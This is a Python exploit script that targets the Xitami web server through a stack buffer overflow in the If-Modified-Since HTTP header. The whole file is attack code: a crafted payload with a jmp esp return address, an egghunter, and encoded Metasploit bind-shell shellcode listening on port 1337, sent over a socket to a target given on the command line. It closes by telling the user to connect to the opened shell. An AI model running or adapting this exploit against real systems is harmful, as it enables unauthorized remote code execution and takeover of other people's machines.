import time
import socket
import sys

if len(sys.argv) != 3:
    print "Usage: ./xitami.py <Target IP> <Target Port>"
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

egghunt = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02"
"\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
"w00t" # 4 byte tag
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

# ./msfpayload windows/shell_bind_tcp lport=1337 exitfunc=process R | ./msfencode -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -c 7 -t c
shellcode = "\xb8\x68\x24\x99\x9c\xdd\xc1\xd9\x74\x24\xf4\x5f"
shellcode += "\x29\xc9\xb1\x56\x31\x47\x13\x03\x47\x13\x83\xef"
shellcode += "\x94\xc6\x6c\x60\x8c\x85\x8f\x99\x4c\xea\x06\x7c"
shellcode += "\x7d\x2a\x7c\xf4\x2d\x9a\xf6\x58\xc1\x51\x5a\x49"
shellcode += "\x52\x17\x73\x7e\xd3\x92\xa5\xb1\xe4\x8f\x96\xd0"
shellcode += "\x66\xd2\xca\x32\x57\x1d\x1f\x32\x90\x40\xd2\x66"
shellcode += "\x49\x0e\x41\x97\xfe\x5a\x5a\x1c\x4c\x4a\xda\xc1"
shellcode += "\x04\x6d\xcb\x57\x1f\x34\xcb\x56\xcc\x4c\x42\x41"
shellcode += "\x11\x68\x1c\xfa\xe1\x06\x9f\x2a\x38\xe6\x0c\x13"
shellcode += "\xf5\x15\x4c\x53\x31\xc6\x3b\xad\x42\x7b\x3c\x6a"
shellcode += "\x39\xa7\xc9\x69\x99\x2c\x69\x56\x18\xe0\xec\x1d"
shellcode += "\x16\x4d\x7a\x79\x3a\x50\xaf\xf1\x46\xd9\x4e\xd6"
shellcode += "\xcf\x99\x74\xf2\x94\x7a\x14\xa3\x70\x2c\x29\xb3"
shellcode += "\xdb\x91\x8f\xbf\xf1\xc6\xbd\x9d\x9d\x2b\x8c\x1d"
shellcode += "\x5d\x24\x87\x6e\x6f\xeb\x33\xf9\xc3\x64\x9a\xfe"
shellcode += "\x52\x62\x1d\xd0\xdc\xe3\xe3\xd1\x1c\x2d\x20\x85"
shellcode += "\x4c\x45\x81\xa6\x07\x95\x2e\x73\xbd\x9f\xb8\xbc"
shellcode += "\xe9\xa1\xb9\x55\xeb\xa1\xab\x65\x62\x47\x9b\x35"
shellcode += "\x24\xd8\x5c\xe6\x84\x88\x34\xec\x0b\xf6\x25\x0f"
shellcode += "\xc6\x9f\xcc\xe0\xbe\xc8\x78\x98\x9b\x83\x19\x65"
shellcode += "\x36\xee\x1a\xed\xb2\x0e\xd4\x06\xb7\x1c\x01\x71"
shellcode += "\x37\xdd\xd2\x14\x37\xb7\xd6\xbe\x60\x2f\xd5\xe7"
shellcode += "\x46\xf0\x26\xc2\xd5\xf7\xd9\x93\xef\x8c\xec\x01"
shellcode += "\x4f\xfb\x10\xc6\x4f\xfb\x46\x8c\x4f\x93\x3e\xf4"
shellcode += "\x1c\x86\x40\x21\x31\x1b\xd5\xca\x63\xcf\x7e\xa3"
shellcode += "\x89\x36\x48\x6c\x72\x1d\xca\x6b\x8c\xe3\xe5\xd3"
shellcode += "\xe4\x1b\xb6\xe3\xf4\x71\x36\xb4\x9c\x8e\x19\x3b"
shellcode += "\x6c\x6e\xb0\x14\xe4\xe5\x55\xd6\x95\xfa\x7f\xb6"
shellcode += "\x0b\xfa\x8c\x63\xbc\x81\xfd\x94\x3d\x76\x14\xf1"
shellcode += "\x3e\x76\x18\x07\x03\xa0\x21\x7d\x42\x70\x16\x8e"
shellcode += "\xf1\xd5\x3f\x05\xf9\x4a\x3f\x0c"

jump = "\xeb\x22" # short jump

buf = "A" * 72                  
buf += "\x8B\x1C\xA9\x71" # jmp esp (user32.dll) / XP SP3 English
buf += jump
buf += "\x90" * 50
buf += egghunt
buf += "w00tw00t" # tag
buf += shellcode

header = (
'GET / HTTP/1.1\r\n'
'Host: %s\r\n'
'If-Modified-Since: pwned, %s\r\n'
'\r\n') % (target, buf)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target, port))
    print "[+] Connected"
except:
    print "[!] Connection Failed"
    sys.exit(0)

print "[+] Sending payload..."
s.send(header)
time.sleep(1)
s.close()

print "[+] Check port 1337 for your shell"